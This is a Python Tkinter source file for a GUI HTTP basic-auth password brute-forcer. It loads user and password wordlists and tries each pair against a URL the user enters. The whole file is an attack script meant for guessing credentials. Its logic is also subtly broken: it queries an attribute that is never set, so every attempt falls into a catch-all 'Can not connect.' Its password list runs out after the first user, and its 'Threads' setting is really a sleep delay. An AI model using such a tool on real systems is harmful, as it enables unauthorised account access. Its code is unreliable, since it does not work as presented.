from tkinter import *
from tkinter import scrolledtext
import tkinter as tk
import socket
import requests
from threading import Thread
import sys
import getopt
from os import path, makedirs
from tkinter import filedialog as fd
from tkinter import messagebox as mBox
from playsound import playsound as ps
from time import sleep

class request_performer():
    def __init__( self):
        self.root=Tk()
        self.root.title("Password Bruteforce -created by Akash Roshan")
        self.root.geometry("600x500+0+0")
        self.root.resizable(0,0)
        
        #=========================== TOP HEADING ==========================#
        self.tops = Frame(self.root,width=800,height=20,bg="green",relief=SUNKEN)
        self.tops.pack(side=TOP)
        
        self.l1=Label(self.tops,font=('arial',40,'bold'),text="Password Bruteforce")
        self.l1.grid(row=0,column=0)
        
        #=========================== Content Frame =========================#
        self.f1 = Frame(self.root,width=800,height=100,bg="green",relief=SUNKEN)
        self.f1.pack(side=TOP)
        
        self.l2=Label(self.f1,font=('arial',20,'bold'),text="Enter Your Url")
        self.l2.grid(row=0,column=0)
        
        self.f2 = Frame(self.root,width=800,height=50,bg="green",relief=SUNKEN)
        self.f2.pack(side=TOP)
        self.name=StringVar
        self.e1=Entry(self.f2, width=40,textvariable=self.name)
        self.e1.grid(row=0,column=0)
        self.e1.focus()
        
        self.f5 = Frame(self.root,width=400,height=40,bg="white",relief=SUNKEN)
        self.f5.pack(side=TOP)
        self.b1=Button(self.f5,font=('arial',15,'bold'),text="Launch",command=self.create_thread,cursor="pirate")   
        self.b1.grid(row=0,column=0)
        
        self.f7 = Frame(self.root,width=400,height=40,bg="white",relief=SUNKEN)
        self.f7.pack(side=TOP)
        self.b2 = Button(self.f7, text="Select User list :   ", command=self.userfilename)     
        self.b2.grid(column=0, row=0, sticky=W)
        self.users = StringVar()
        self.e3= Entry(self.f7, width=40, textvariable=self.users)
        self.e3.grid(column=1, row=0, sticky=W)
        
        self.f8 = Frame(self.root,width=400,height=40,bg="white",relief=SUNKEN)
        self.f8.pack(side=TOP)
        self.b3 = Button(self.f8, text="Select Password list :   ", command=self.passfilename)     
        self.b3.grid(column=0, row=0, sticky=W)
        self.password = StringVar()
        self.e4= Entry(self.f8, width=40, textvariable=self.password)
        self.e4.grid(column=1, row=0, sticky=W)
        
        self.f9 = Frame(self.root,width=800,height=50,bg="green",relief=SUNKEN)
        self.f9.pack(side=TOP)
        self.l3=Label(self.f9,font=('arial',10,'bold'),text="Threads")
        self.l3.grid(row=0,column=0)
        self.thread = IntVar()
        self.e5= Entry(self.f9, width=40, textvariable=self.thread)
        self.e5.grid(column=1, row=0, sticky=W)
        
        
        self.f6 = Frame(self.root,width=800,height=50,bg="green",relief=SUNKEN)
        self.f6.pack(side=TOP)
        
        scrolW  = 50; scrolH = 20
        self.scr = scrolledtext.ScrolledText(self.f6, width=scrolW, height=scrolH, wrap=WORD)
        self.scr.grid(column=0, row=3, sticky='WE', columnspan=3)
    
    def userfilename(self):
        fDir  = path.dirname(__file__)
        self.uname = fd.askopenfilename(parent=self.root, initialdir=fDir)
        self.e3.config(state='disabled')
        self.e3.delete(0, END)
        self.e3.insert(0, self.uname)
        print(self.uname)
        self.scr.insert(INSERT,str(self.uname))
    
    def passfilename(self):
        fDir  = path.dirname(__file__)
        self.pname = fd.askopenfilename(parent=self.root, initialdir=fDir)
        self.e4.config(state='disabled')
        self.e4.delete(0, END)
        self.e4.insert(0, self.pname)
        print(self.pname)
        self.scr.insert(INSERT,str(self.pname))
    def create_thread(self):
        runt = Thread(target=self.run)
        runt.start()
    def run(self):
        ps('start.wav')
        self.t = int(self.e5.get())
        u=open(self.uname, mode='r')
        p=open(self.pname, mode='r')
        for line in u:
            self.username=line#.replace('\n', ' ')
            for x in p:
                self.password=x#.replace('\n', ' ')
                print("Username :",line)
                print("Password :",x)
                sleep(self.t)            
                url =(self.e1.get())
        
                try:
                    r = requests.get(self.url, auth=(self.username, self.password))
                    if r.status_code == 200:
                        print ("[+] Password found - " + self.password)
                        self.scr.insert(INSERT,"[+] Password found - " + self.password)
                        sys.exit()
                    else:
                        print ("Not valid " + self.password)
                        self.scr.insert(INSERT,"Not valid " + self.password)
        
                except:
                    print("Can not connect.")
                    self.scr.insert(INSERT,"Can not connect.")

r = request_performer()
r.root.mainloop()
